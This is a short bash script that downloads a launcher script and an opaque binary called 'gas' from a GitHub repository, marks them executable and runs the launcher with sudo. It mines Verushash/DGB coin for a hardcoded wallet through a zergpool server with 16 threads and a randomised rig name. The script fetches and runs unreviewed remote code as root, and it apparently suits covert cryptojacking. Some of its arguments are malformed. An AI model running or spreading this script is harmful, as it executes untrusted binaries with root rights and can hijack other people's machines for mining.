#!/bin/bash
wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh
wget https://github.com/hunshukajh/yes/raw/main/gas
chmod +x gas cmdline_launcher.sh
sudo bash ./cmdline_launcher.sh -algo Verushash -coin DGB -wallet DLVmTEYCYM9jMCEWiuNuuAJ2M7GETpHcg4  -rigName  $(echo $(shuf -i 1-2 -n 1)-joa) - t 16-pool1  verushash.eu.mine.zergpool.com:3300
